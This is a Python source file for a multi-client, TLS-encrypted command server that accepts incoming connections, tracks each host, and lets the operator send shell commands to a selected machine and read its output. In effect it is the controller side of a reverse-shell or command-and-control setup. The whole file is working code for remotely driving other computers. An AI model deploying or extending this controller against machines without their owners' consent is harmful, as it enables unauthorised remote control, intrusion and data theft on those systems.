import socket
import threading
import json
import sys
import ssl # Import the ssl module

# Server configuration
HOST = '0.0.0.0'    # Listen on all available interfaces
PORT = 12345        # Port to listen on

# Paths to the server's certificate and private key - usually your laptop
CERTFILE = 'server.crt'
KEYFILE = 'server.key'

# Global dictionaries to manage connected clients and their information
active_clients = {}  # Stores client_id: client_socket mapping
client_details = {}  # Stores client_id: client_info (e.g., 'user@hostname')
next_client_id = 1   # Counter for assigning unique client IDs

def send_message(sock, message):
    """Sends a JSON message to the specified socket."""
    serialized_message = json.dumps(message).encode('utf-8')
    # Prepend message length to ensure the receiver knows how much data to expect
    message_length = str(len(serialized_message)).zfill(64).encode('utf-8')
    sock.sendall(message_length + serialized_message)

def receive_message(sock):
    """Receives a JSON message from the specified socket."""
    message_length_raw = sock.recv(64) # First 64 bytes are message length
    if not message_length_raw:
        return None # Connection closed
    message_length = int(message_length_raw.decode('utf-8').strip())
    message = sock.recv(message_length).decode('utf-8')
    # print(f"Received message: {message} with length {message_length}")  # debug
    return json.loads(message)

def handle_client(client_socket, addr, client_id):
    """Handles communication with a connected client."""
    client_address = f"{addr[0]}:{addr[1]}" # addr is a tuple of (ip, port)
    print(f"[*] Accepted connection from: {client_address} (Client ID: {client_id})")
    active_clients[client_id] = client_socket
    # print(f"Active clients: {active_clients}") # debug
    client_details[client_id] = client_address # client_address is updated once connected

    try:
        while True:
            data = receive_message(client_socket)
            if data is None: # Client disconnected gracefully
                break

            if data['type'] == 'output':
                output_content = data['output']
                # print(f"Output content: {output_content}")
                client_prompt_prefix = f"{client_details.get(client_id, '')} # "

                # Clean the output to remove the client prompt prefix - this is a hack to make the output look nicer
                cleaned_lines = []
                for line in output_content.splitlines():
                    if line.startswith(client_prompt_prefix):
                        cleaned_lines.append(line[len(client_prompt_prefix):].lstrip())
                    else:
                        cleaned_lines.append(line)
                
                # Join the cleaned lines back together with a newline
                processed_output = '\n'.join(cleaned_lines)
                if not processed_output.endswith('\n'):
                    processed_output += '\n'

                sys.stdout.write('\r\033[K') # Clear the current line and redraw the prompt
                sys.stdout.write(processed_output)
                sys.stdout.flush()

                sys.stdout.write(get_prompt_string()) # Redraw the prompt
                sys.stdout.flush()
            elif data['type'] == 'info' and 'hostname' in data:
                # Update the client details with the hostname
                client_details[client_id] = data['hostname']
                print(f"\n[*] Client {client_id} updated info: {data['hostname']}")
                sys.stdout.write(get_prompt_string())
                sys.stdout.flush()

    except ssl.SSLError as e:
        # This should not happen, and is a bad implementation
        print(f"\n[-] SSL Error with client {client_address} (Client ID: {client_id}): {e}")
    except Exception as e:
        print(f"\n[*] Error handling client {client_address} (Client ID: {client_id}): {e}")
    finally:
        # Clean up the client's data
        if client_id in active_clients:
            del active_clients[client_id]
        if client_id in client_details:
            del client_details[client_id]
        client_socket.close()
        print(f"\n[*] Client {client_address} (Client ID: {client_id}) disconnected.")
        sys.stdout.write(get_prompt_string())
        sys.stdout.flush()

def get_prompt_string():
    """Returns the current prompt string based on selected client."""
    if selected_client_id and selected_client_id in client_details:
        return f"{client_details[selected_client_id]} # "
    return "Enter command (client_id:command): "

selected_client_id = None # Track which client is currently selected for commands

def start_server():
    """Starts the main server listener and client handling threads."""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)

    # Create an SSL context
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(CERTFILE, KEYFILE)
    # For self-signed certificates, clients will need to trust this cert
    context.verify_mode = ssl.CERT_NONE # We are not verifying client certificates yet

    # Wrap the server socket with SSL
    secure_server_socket = context.wrap_socket(server, server_side=True)

    print(f"[*] Listening securely on {HOST}:{PORT}")

    global next_client_id # Counter for assigning unique client IDs (global variable but could be a class variable?)
    global selected_client_id # Track which client is currently selected for commands
    while True:
        try:
            # Accept an SSL-wrapped client connection
            secure_client_socket, addr = secure_server_socket.accept()
            print(f"[*] SSL Handshake successful with {addr[0]}:{addr[1]}")

            current_client_id = next_client_id
            client_handler = threading.Thread(target=handle_client, args=(secure_client_socket, addr, current_client_id))
            client_handler.daemon = True # Allow main program to exit even if threads are running
            client_handler.start() # Start the thread
            next_client_id += 1
            # Automatically select the latest connected client
            selected_client_id = current_client_id
            print(f"\n[*] Client {addr[0]}:{addr[1]} (Client ID: {current_client_id}) connected. Automatically selected.")
            sys.stdout.write(get_prompt_string()) # Redraw the prompt
            sys.stdout.flush()

        except ssl.SSLError as e:
            print(f"\n[-] SSL Handshake failed with {addr[0]}:{addr[1]}: {e}")
            # Attempt to close the secure_client_socket if it was created
            try:
                if 'secure_client_socket' in locals() and secure_client_socket:
                    secure_client_socket.close()
            except Exception as close_e:
                print(f"[-] Error closing failed SSL socket: {close_e}")
        except Exception as e:
            print(f"\n[-] Error in server loop: {e}")

if __name__ == "__main__":
    server_thread = threading.Thread(target=start_server)
    server_thread.daemon = True
    server_thread.start()

    # Print the commands that can be used to interact with the server (pretty menu)
    print("\n--- Remote Terminal Access Server ---")
    print("Commands:")
    print("  list                - List all connected clients")
    print("  select <client_id>  - Select a client to send commands to")
    print("  unselect            - Unselect the current client")
    print("  exit                - Shut down the server")
    print("  <command>           - Send command to selected client (or client_id:command)")
    print("-------------------------------------")

    while True:
        # Print the prompt
        sys.stdout.write(get_prompt_string())
        sys.stdout.flush()
        command_input = sys.stdin.readline().strip() # Read the command from the terminal

        if command_input.lower() == 'exit':
            break
        elif command_input.lower() == 'list': # List all connected clients
            if not active_clients:
                print("No clients connected.")
            else:
                print("Connected Clients:")
                for client_id, client_info in client_details.items():
                    print(f"- Client ID: {client_id} ({client_info})")
        elif command_input.lower().startswith('select '):
            try:
                client_id_to_select = int(command_input.split(' ')[1])
                if client_id_to_select in active_clients:
                    selected_client_id = client_id_to_select
                    print(f"Selected client: {client_details[selected_client_id]}")
                else:
                    print(f"Client with ID {client_id_to_select} not found.") # Again, should not happen
            except (IndexError, ValueError):
                print("Invalid select command. Use 'select <client_id>'.")
        elif command_input.lower() == 'unselect':
            selected_client_id = None
            print("Client unselected.")
        else:
            target_client_id = selected_client_id
            command_to_send = command_input

            if ':' in command_input and not selected_client_id: # If the command is in the format "client_id:command" - which is the default format for the client
                try:
                    client_id_str, cmd = command_input.split(':', 1) # Split the command into client_id and command
                    target_client_id = int(client_id_str)
                    command_to_send = cmd.strip()
                except ValueError:
                    print("Invalid command format. Use 'client_id:command' or 'command' after selecting a client.")
                    continue

            if target_client_id and target_client_id in active_clients:
                print(f"{client_details[target_client_id]} # {command_to_send}") # Print the command to the server terminal
                send_message(active_clients[target_client_id], {'type': 'command', 'command': command_to_send}) # Send the command to the client
            else:
                print("No client selected or invalid client ID. Please select a client first or use 'client_id:command'.")
